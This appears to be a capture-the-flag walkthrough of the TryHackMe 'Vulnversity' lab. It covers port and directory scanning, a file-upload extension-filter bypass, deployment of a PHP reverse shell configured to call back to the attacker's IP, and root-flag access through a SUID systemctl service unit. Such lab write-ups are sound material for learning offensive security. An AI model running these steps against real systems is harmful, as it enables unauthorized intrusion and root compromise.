tryhackme | vulnversity

https://tryhackme.com/r/room/vulnversity

writeups:

https://unicornsec.com/home/tryhackme-vulnversity


#### nmap scan:

```bash
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.3
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
|_  0/4 checks are positive: Host is CLEAN or ports are blocke
```



#### dirbuster scan: 

`gobuster dir -u http://10.10.33.213/3333 -w /usr/share/wordlists/dirb/common.txt -t 4 -o dirb.txt`

```bash
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 317] [--> http://10.10.33.213:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.33.213:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.33.213:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 322] [--> http://10.10.33.213:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.33.213:3333/js/]
/server-status        (Status: 403) [Size: 302]
```

#### upload/text extension filtering using burpsuite: 

Burpsuite->Connect ProxyIntercepter->Test Extensions


#### Upload .phtml php payload
use payload from `/usr/share/webshells/php/php-reverse-shell.php`

edit following values (using tun0 network IP)

```bash
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.6.16.52  netmask 255.255.128.0  destination 10.6.16.52
```


```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.6.16.52';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Upload file to and curl it

`curl http://10.10.33.213:3333/internal/uploads/php-reverse-shell.phtml`


after gaining access, search for SUID permission programs, this file stands out: 

`/bin/systemctl`

create env variable, echo a file that outputs root flag to a tmp file

```bash
[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"

[Install]
WantedBy=multi-user.target
```









